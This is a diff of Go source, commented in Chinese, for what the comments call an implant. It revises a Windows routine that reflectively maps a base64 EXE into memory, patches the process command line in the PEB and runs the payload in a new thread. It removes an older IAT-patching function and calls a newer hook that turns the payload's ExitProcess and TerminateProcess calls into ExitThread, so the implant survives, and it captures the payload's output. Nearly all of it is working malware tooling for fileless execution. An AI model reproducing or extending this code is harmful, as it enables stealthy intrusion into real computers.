@@ -4,7 +4,6 @@ package main
 
 import (
 	"encoding/base64"
-	"encoding/binary"
 	"fmt"
 	"runtime"
 	"syscall"
@@ -26,11 +25,12 @@ import (
 //   - 只能执行与植入体同架构的 EXE（32 位镜像无法进 64 位进程）；
 //   - 不要把 Go 编译的 EXE 这样跑：宿主植入体也是 Go，两个 Go runtime 在同一进程里
 //     互相踩（实测载荷 argv 正常拿到，但宿主随后崩溃）；
-//   - 载荷若自行退出，其 CRT（msvcrt）会调用 ExitProcess 结束**宿主进程**：
-//     已对镜像自身 IAT 的 ExitProcess/TerminateProcess 做 ExitThread 重定向，
-//     但 CRT 内部的调用拦不住（彻底解决需 hook 系统 API），
-//     因此「跑完即退」的工具请走落地执行；
-//   - 内存中运行的进程不重定向 stdout，捕获不到控制台输出。
+//   - 载荷自行退出（ExitProcess / RtlExitUserProcess / 对本进程的 TerminateProcess）
+//     由 mexecguard_windows.go 在 IAT 层接管成"只退线程"：**宿主不再被带走**
+//     （v1.4.0 S6 P0-2）。覆盖范围与明确不覆盖的情形见那个文件的头部注释；
+//     拿不到覆盖的载荷（运行时解析 API 地址后裸调）仍会把宿主带走。
+//   - stdout/stderr 由 mexecguard_windows.go 重定向到本进程管道并回传；
+//     拿不到内容时结果里会明确写出原因，不会静默给空串。
 
 // processBasicInformation 对应 PROCESS_BASIC_INFORMATION。
 type processBasicInformation struct {
@@ -132,78 +132,20 @@ func patchProcessCommandLine(newCmd string) (func(), error) {
 	return restore, nil
 }
 
-// redirectExitImports 把映射镜像里对 ExitProcess / RtlExitUserProcess / TerminateProcess
-// 的导入重定向到 ExitThread。
-//
-// 为什么必须做：内存执行的 EXE 正常返回时，其 CRT 会调 exit()→ExitProcess，而宿主
-// 就是植入体本身——不拦的话载荷一跑完就把植入体一起干掉（实测 attrib.exe/cmd.exe 均如此）。
-// donut 也是靠 Thread=1 + ExitOpt=1 才避免这个问题；这里在 IAT 层面直接改指针，
-// 让载荷的"退出进程"变成"退出线程"，不影响植入体。
-func redirectExitImports(base uintptr, info *memPE) int {
-	procExitThread := resolveAPI("kernel32.dll", "ExitThread")
-	exitThreadAddr := procExitThread.resolved()
-	if exitThreadAddr == 0 {
-		return 0
-	}
-
-	// 需要拦截的目标地址（逐个模块取，取不到就跳过）
-	targets := map[uintptr]bool{}
-	for _, spec := range []struct{ dll, fn string }{
-		{"kernel32.dll", "ExitProcess"},
-		{"kernel32.dll", "TerminateProcess"},
-		{"ntdll.dll", "RtlExitUserProcess"},
-		{"ntdll.dll", "NtTerminateProcess"},
-	} {
-		if p := resolveAPI(spec.dll, spec.fn); p.resolved() != 0 {
-			targets[p.resolved()] = true
-		}
-	}
-	if len(targets) == 0 {
-		return 0
-	}
-
-	redirected := 0
-	step := uint32(4)
-	if info.is64 {
-		step = 8
-	}
-	descRVA := info.importRVA
-	for info.importRVA != 0 {
-		firstThunkRVA := binary.LittleEndian.Uint32(memBytes(base, descRVA+16, 4))
-		if firstThunkRVA == 0 {
-			break
-		}
-		iatRVA := firstThunkRVA
-		for {
-			cur := readThunk(base, iatRVA, info.is64)
-			if cur == 0 {
-				break
-			}
-			if cur != 0 && targets[uintptr(cur)] {
-				// ExitThread(0)：载荷调用"退出进程"只结束自己所在线程。
-				// 镜像映射完成后其节页已是 RX/RW（不再有 RWX），所以这里先临时把
-				// 该 IAT 项所在页改回 RW，写完立即还原原保护。
-				if werr := withWritable(base+uintptr(iatRVA), uintptr(step), func() {
-					writeThunk(base, iatRVA, info.is64, exitThreadAddr)
-				}); werr == nil {
-					redirected++
-				}
-			}
-			iatRVA += step
-		}
-		descRVA += 20
-		if binary.LittleEndian.Uint32(memBytes(base, descRVA+12, 4)) == 0 &&
-			binary.LittleEndian.Uint32(memBytes(base, descRVA+16, 4)) == 0 {
-			break
-		}
-	}
-	return redirected
-}
-
+// 注：v1.3.4 那个"只改被映射镜像自身 IAT"的 redirectExitImports 已删除 ——
+// 它拦不住 msvcrt/ucrtbase 内部的 ExitProcess（那走的是 CRT DLL 自己的 IAT），
+// 而"main 返回"恰恰是最常见的收尾路径。现在统一由 mexecguard_windows.go 的
+// guardArmImage 接管（镜像 IAT + 已加载模块 IAT 两层 + 回调里记录退出码），
+// 判定与覆盖边界见那个文件的头部注释。
 // runMappedImage 反射式内存执行 EXE，并把 args 作为命令行参数传入。
 //
 // imageName 作为 argv[0]（为空时用 "program.exe"）；waitMs > 0 时等待线程结束
 // 并返回退出码，否则立即返回（程序继续在后台线程运行）。
+//
+// v1.4.0 S6 P0-2 起，本函数的返回信息里会带上三件事：
+//  1. 退出拦截统计（镜像 IAT + 已加载模块 IAT 各改了几处）；
+//  2. 载荷的退出调用有没有被拦成 ExitThread（拦住 = 宿主没掉线）；
+//  3. 载荷的 stdout/stderr 原文（拿不到时写明原因，不给静默空串）。
 func runMappedImage(dataB64, args, imageName string, waitMs int) (string, int32, string) {
 	raw, err := base64.StdEncoding.DecodeString(dataB64)
 	if err != nil {
@@ -228,12 +170,15 @@ func runMappedImage(dataB64, args, imageName string, waitMs int) (string, int32,
 	// 先注入命令行，再映射执行（CRT 启动时读 PEB）
 	restore, perr := patchProcessCommandLine(cmdLine)
 	if perr != nil {
+		guardTrace("runMappedImage: 命令行注入失败: %v", perr)
 		// 参数注入失败不阻断执行：仅在无参场景下降级，带参场景明确报错
 		if args == "" {
 			restore = func() {}
 		} else {
 			return "", -1, fmt.Sprintf("无法注入命令行参数（%v）：内存执行 exe 需要 PEB 命令行补丁", perr)
 		}
+	} else {
+		guardTrace("runMappedImage: 命令行已注入 PEB: %q", cmdLine)
 	}
 
 	base, info, err := mapImagePE(raw)
@@ -246,50 +191,94 @@ func runMappedImage(dataB64, args, imageName string, waitMs int) (string, int32,
 		return "", -1, "PE has no entry point"
 	}
 	entry := base + uintptr(info.entryRVA)
+	guardTrace("runMappedImage: 映射完成 base=%#x entry=%#x size=%d", base, entry, info.sizeOfImage)
 
-	// 拦掉载荷的"退出进程"调用，避免它跑完把植入体一起带走
-	exitRedirects := redirectExitImports(base, info)
+	// 退出拦截（v1.4.0 S6 P0-2）：把"载荷退出进程"在 IAT 层接管成"只退线程"。
+	// 必须在 CreateThread 之前武装：载荷可能一进去就调 ExitProcess。
+	exitCountBefore, _ := guardExitStats()
+	imageHits, moduleHits := guardArmImage(base, info, "exe_mem")
+
+	// stdout/stderr 重定向：同样必须在 CreateThread 之前完成 ——
+	// 被执行镜像的 CRT 在首次使用 stdio 时通过 GetStdHandle 读走句柄。
+	capture := guardBeginStdioCapture()
+	guardTrace("runMappedImage: 输出捕获就绪 enable=%v note=%q", capture.enable, capture.note)
 
 	procCreateThread := resolveAPI("kernel32.dll", "CreateThread")
 	if procCreateThread.resolved() == 0 {
+		capture.End(false)
 		restore()
 		return "", -1, "CreateThread 不可用"
 	}
 	var tid uint32
 	hThread, _, callErr := procCreateThread.Call(0, 0, entry, 0, 0, uintptr(unsafe.Pointer(&tid)))
 	if hThread == 0 {
+		capture.End(false)
 		restore()
 		return "", -1, fmt.Sprintf("CreateThread 失败: %v", callErr)
 	}
+	guardMarkExecThread(tid)
+	guardTrace("runMappedImage: 载荷线程已创建 tid=%d hThread=%#x", tid, hThread)
 
-	result := fmt.Sprintf("EXE 已在内存中执行：基址 0x%x，入口 0x%x，线程 %d，命令行 %q（%d 字节镜像，退出拦截 %d 处）",
-		base, entry, tid, cmdLine, len(raw), exitRedirects)
+	result := fmt.Sprintf("EXE 已在内存中执行：基址 0x%x，入口 0x%x，线程 %d，命令行 %q（%d 字节镜像）\n%s",
+		base, entry, tid, cmdLine, len(raw), guardPatchSummary(imageHits, moduleHits))
 
 	if waitMs <= 0 {
+		stdoutText, stderrText, capNote := capture.End(false)
 		restore()
-		return result + "\n[!] 未等待线程结束（wait_ms=0），程序在后台线程继续运行", 0, ""
+		return result + "\n[!] 未等待线程结束（wait_ms=0），程序在后台线程继续运行" +
+			guardFormatCaptured(stdoutText, stderrText, capNote), 0, ""
 	}
 
-	// 注意：已对镜像自身 IAT 里的 ExitProcess/TerminateProcess 做了 ExitThread 重定向，
-	// 但载荷 CRT（msvcrt/kernelbase）内部直接调用的 ExitProcess 拦不住——这类载荷
-	// 一旦自行退出仍会带走植入体。需要"跑完即退"的程序请改用落地执行/plugin_exe。
+	// 等载荷线程结束。等待期间：载荷的 ExitProcess 会被 IAT 回调改写成 ExitThread，
+	// 因此"程序正常收尾"不再等于"宿主进程结束"。
 	procWait := resolveAPI("kernel32.dll", "WaitForSingleObject")
-	var exitCode uint32
+	threadDone := false
 	if procWait.resolved() != 0 {
 		start := time.Now()
 		procWait.Call(hThread, uintptr(waitMs))
-		if elapsed := time.Since(start); elapsed >= time.Duration(waitMs)*time.Millisecond {
-			restore()
-			return result + fmt.Sprintf("\n[!] 等待 %dms 超时，程序仍在后台线程运行（线程 %d）", waitMs, tid), 0, ""
+		threadDone = time.Since(start) < time.Duration(waitMs)*time.Millisecond
+		if !threadDone {
+			// 刚好在超时边界结束的情况：再非阻塞探一次，避免把"已完成"误报成"还在跑"
+			if r, _, _ := procWait.Call(hThread, 0); r == 0 { // WAIT_OBJECT_0
+				threadDone = true
+			}
 		}
 	} else {
 		time.Sleep(time.Duration(waitMs) * time.Millisecond)
 	}
-	if procGetExit := resolveAPI("kernel32.dll", "GetExitCodeThread"); procGetExit.resolved() != 0 {
-		procGetExit.Call(hThread, uintptr(unsafe.Pointer(&exitCode)))
+
+	var exitCode uint32
+	if threadDone {
+		if procGetExit := resolveAPI("kernel32.dll", "GetExitCodeThread"); procGetExit.resolved() != 0 {
+			procGetExit.Call(hThread, uintptr(unsafe.Pointer(&exitCode)))
+		}
+	}
+	stdoutText, stderrText, capNote := capture.End(threadDone)
+	exitCountAfter, lastExit := guardExitStats()
+	guardTrace("runMappedImage: 等待结束 threadDone=%v 退出码=%d 拦截计数 %d→%d stdout=%d字节 stderr=%d字节 note=%q",
+		threadDone, int32(exitCode), exitCountBefore, exitCountAfter, len(stdoutText), len(stderrText), capNote)
+	// 线程句柄不再需要：无论线程是否还在跑，关掉我们的引用都不影响它（避免句柄泄漏）。
+	if procClose := resolveAPI("kernel32.dll", "CloseHandle"); procClose.resolved() != 0 {
+		procClose.Call(hThread)
 	}
 	restore()
-	return result + fmt.Sprintf("\n线程已结束，退出码 %d（注：内存执行不重定向 stdout，无控制台输出）", int32(exitCode)), int32(exitCode), ""
+
+	out := result
+	if threadDone {
+		out += fmt.Sprintf("\n线程已结束，退出码 %d", int32(exitCode))
+	} else {
+		out += fmt.Sprintf("\n[!] 等待 %dms 超时，程序仍在后台线程运行（线程 %d）", waitMs, tid)
+	}
+	// 退出拦截现场：区分"真的拦到了载荷的退出调用"与"本次没观察到退出调用"。
+	if exitCountAfter > exitCountBefore {
+		out += fmt.Sprintf("\n[退出拦截] 载荷调用 %s(%d) 已被改写为 ExitThread：只结束载荷线程，宿主植入端**未退出**。",
+			lastExit.via, lastExit.code)
+	} else {
+		out += "\n[退出拦截] 本次未观察到载荷调用 ExitProcess/RtlExitUserProcess/TerminateProcess(本进程)。"
+	}
+	out += guardFormatCaptured(stdoutText, stderrText, capNote)
+	guardTrace("runMappedImage: 结果已生成（%d 字节），返回给任务 worker", len(out))
+	return out, int32(exitCode), ""
 }
 
 // checkPEArchMatch 校验 PE 机器码与当前植入体架构一致。
